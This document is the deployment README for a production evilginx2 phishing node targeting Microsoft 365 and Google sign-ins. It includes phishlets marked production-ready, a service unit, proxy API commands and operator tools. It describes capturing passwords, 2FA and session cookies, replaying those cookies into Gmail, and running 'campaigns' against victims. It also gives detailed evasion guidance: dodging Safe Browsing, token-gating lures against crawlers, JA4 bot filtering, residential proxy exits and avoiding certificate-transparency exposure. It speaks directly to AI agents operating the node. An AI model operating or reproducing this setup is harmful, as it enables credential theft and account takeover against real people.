# Deploy — evilginx2 node (fake-evilginx-pro) on a VPS

Current state of the **production node** (1 internet-facing VPS, base
`<BASE>.<ZONE>`, wildcard cert via DNS-01). Updated: **2026-09-17**.

> 🔒 **OPSEC**: real hostnames, IPs, SSH key paths and full lure URLs live only
> in internal docs outside the repo (`.worklog/`, memory) — never committed.

> 🤖 **AI agents**: read `skills/operating-fake-evilginx-pro/SKILL.md` before
> installing/operating — runbook + every proven gotcha (duplicate `phish_sub`,
> vacuous completion, autocert burn, Google datacenter-IP blocks, silent SNI
> drops).

## Phishlet status

| Phishlet | Status | Notes |
|---|---|---|
| `ms365.yaml` | ✅ **CLOSED — production-ready** | All targets met: work flow (ESTSAUTH) + full consumer MSA (`WLSSC` is the key cookie) + mailbox reuse + SB-bypass verified + token-gate + CSD hardening. Two caveats in the worklog (work-flow E2E on the new domain awaits a hotspot — Umbrella blocks on-net; password-login after hardening untested — test account is passwordless). Kept ENABLED on the node |
| `google.yaml` | ✅ **CLOSED — production-ready via real-browser relay** | Classic MITM is impossible (origin-bound botguard); solved with the `bgrelay` sidecar (`tools/relay/`, feature #18): real-account capture incl. number-match 2FA, credentials + the full `.google.com` cookie set (`~/bgrelay-store/`), **cookie replay into Gmail verified**. CSD hardening + uTLS + residential exit via feature #17. Relay lure: `/<PATH>?t=…` (relay:true). Guide: `docs/google-relay.md` |

**Lure URLs:** `/<PATH1>`, `/<PATH2>` on landing `signin.<BASE>.<ZONE>`
- MS365: `/<PATH>` (plain) + `/<PATH>?t=<token>` (token-gated) on landing
  `accounts.<BASE>.<ZONE>` — tokens come from the API, never stored here

## Current architecture

```
Victim ── DNS *.<BASE>.<ZONE> ──► evilginx2 :443 (internet-facing, cloud VPS)
                                    │  wildcard cert *.<BASE>.<ZONE> (DNS-01, no per-host certs)
                                    │  botguard: -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32
                                    │  lure token-gate: missing ?t= → benign 302 (SB never classifies)
                                    ▼
                                 Origin (login.microsoftonline.com / accounts.google.com …)
```

- **InfraGuard is DISABLED** (`systemctl disable --now infraguard`): the double
  L7 layer broke MS OAuth. Evilginx serves :443 directly; botguard handles
  scanner decoys (JA4 allowlist + UA blocklist + telemetry probe).
- **Systemd unit** (`/etc/systemd/system/evilginx2.service`):

```
ExecStart=/bin/sh -c 'tail -f /dev/null | <INSTALL_DIR>/evilginx2 \
  -p <INSTALL_DIR>/phishlets -api 9443 \
  -botguard -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32'
```

  ⚠ NO `-jsobf ultra` (breaks the MS login page JS), NO `-debug` in production
  (leaks plaintext passwords into the journal). `-bg-trusted` = operator/VPS
  internal IPs, skipping bot scoring for tests.
- **Operator API**: `:9443` mTLS, client certs in `~/.evilginx/api/`.
- **bgrelay sidecar**: `:9445` loopback (Google relay), captures in
  `~/bgrelay-store/`; env `RELAY_SOCKS` (residential exit — secret, via
  systemd drop-in) and `RELAY_OP_KEY` (pinned).

## Upstream proxy + per-target routing (feature #17)

SOCKS5/HTTP(S) proxy with auth for upstream traffic. The strength: **routing by
domain suffix** — only listed domains go through the proxy, everything else
dials direct. Current node setup: Google through a residential exit, MS365 on
the node's own IP.

**Management (mTLS API or console):**
```bash
# API — full config (applies live, NO restart):
POST /proxy {"enabled":true,"type":"socks5","address":"<host>","port":<port>,
             "username":"<u>","password":"<p>","routes":["google.com","gstatic.com","googleusercontent.com"]}
POST /proxy {"enabled":false}            # off (partial update — omitted keys keep values)
GET  /proxy                               # status (password MASKED)

# egconsole:
proxy                                     # status
proxy set socks5 <host> <port> <user> <pass> google.com,gstatic.com,googleusercontent.com
proxy route add microsoftonline.com       # add a routed suffix (hot-apply)
proxy route del <suffix> | proxy on | proxy off

# terminal on the node:
proxy | proxy routes | proxy route add|del <suffix> | proxy enable | proxy disable
```

**Notes:** GET returns a MASKED password — a POST without the `password` key
keeps the old value (partial update); never write asterisks back over it. Empty
routes = ALL upstream traffic through the proxy (original behavior). The
residential egress must differ from the node IP — verify with
`curl --socks5 <proxy> https://ifconfig.me` before configuring.

## Operator-side tools (workstation)

| Tool | Role |
|---|---|
| `tools/egconsole.py` | The single REPL console: fleet API (status/phishlets/sessions/lures), `export <id>`, `open <id>` (signed-in browser), `tail` (SSH journal), `puppet` — config `tools/my-servers.json` + `tools/console.json` (gitignored; templates: `*.example.json`) |
| `tools/lib/session_launcher.py` | Opens Chrome/Edge with session cookies from the API (`--fresh`, `--headless`, `--disable-http2` for login.live.com) |
| `deploy/export_session_cookies.py` | Node-side: dump db cookies → Cookie-Editor JSON |
| `src/puppet` (evilpuppet-lite) | chromedp headless: auto-login + wait for MFA + push cookies via the mTLS API |

## Operating rules (each proven by a real burn/loss)

- **NEVER** enable `autocert` / issue per-host certs on an internet-facing
  node — every per-host cert lands in CT logs = burn risk. Wildcard DNS-01 only
  (runbook: `wildcard-cert-setup.sh`).
- The old domain was burned x2 by Google Safe Browsing (registered-domain
  poisoning) — NO real campaign on it; internal testing only. Real campaigns:
  **a fresh domain** + `wildcard-cert-setup.sh` from scratch (full guide in the
  root README, "New domain for a campaign").
- **Do not test lures with a real SB-enabled Chrome/Safari** — test with
  curl/IAB/SB-off browsers (client-side detection flags from the tester's own
  browser).
- **Phishlets are gitignored by design** (`src/phishlets/*.yaml`) — the public
  repo never ships campaign phishlets (comments + structure leak targets).
  Operations: place phishlet files in `src/phishlets/` on the node; `deploy.sh`
  warns when missing (override with `ALLOW_NO_PHISHLET=1`). Lab sample:
  `examples/phishlets/`.
- **Phishlets sharing one base domain: NEVER duplicate `phish_sub`** —
  duplicates make `getPhishletByPhishHost` (a Go map, random iteration) bind
  the wrong phishlet → cross-redirects/dead sessions. google uses
  `signin`/`gwww`, ms365 keeps `accounts`/`www`.
- Always take lure URLs from the console/API (correct landing host) — an
  unknown hostname outside `IsActiveHostname` is **silently dropped** by
  evilginx (the browser hangs with no TLS alert — opsec by design).
- Campaign lures are **token-gated** (`"token":"auto"`) — bare lure URLs are
  what crawlers should see (benign redirect).
- `-debug` only while iterating, then OFF immediately (leaks passwords into
  the journal); rotate the journal if it was on.
- Real work accounts: NEVER test on company accounts (only provisioned test
  accounts/tenants).
- The db stores plaintext passwords — redact before archiving/sharing.

## Verified platform limits (not fixable by configuration)

- **Consumer MSA (personal outlook/hotmail)**: Microsoft splits the post-auth
  flow across domains (account.live.com…) → password + cookies ARE captured,
  but the victim's in-browser session doesn't persist. A structural limit —
  the commercial Pro behaves the same. Work accounts (single-host AAD) are
  unaffected.
- **Passkey/passwordless**: structurally MITM-resistant — the phishlet only
  captures when the account uses a password.
- **Google + classic MITM (final result 2026-09-11, 3 combinations tested):**
  Google rejects the sign-in server-side regardless of IP (AWS / VN hosting /
  VNPT residential) and TLS (Go / uTLS Chrome) — Google's botguard is
  origin-bound: running the page on the phish domain fails the bgdata check.
  Username capture (`f.req`), uTLS and CSD hardening all work; the single
  bottleneck is the origin-bound botguard layer. This is a platform limit of
  EVERY HTTPS MITM proxy for Google — solved in this fork by the real-browser
  relay (#18) instead.
- `ERR_HTTP2_PROTOCOL_ERROR` between headless Chromium and login.live.com: use
  `--disable-http2`.

## File map

| File | Role |
|---|---|
| `deploy.sh` | orchestrator for a fresh node (deps/certs/evilginx/ja4/verify) |
| `wildcard-cert-setup.sh` | wildcard DNS-01 + autocert OFF + renew hook (runbook for new bases/domains) |
| `setup_evilginx.sh` / `setup_infraguard.sh` | service setup (infraguard currently OFF — kept as an option) |
| `sync-node.sh` | one-command source update: sync src+relay → build → restart → heartbeat |
| `templates/*.tpl` | systemd unit + infraguard config **placeholder templates** (real values rendered on the node, never committed) |
| `export_session_cookies.py` | node-side session cookie export |
| `tools/egconsole.py` (outside deploy/) | operator console |
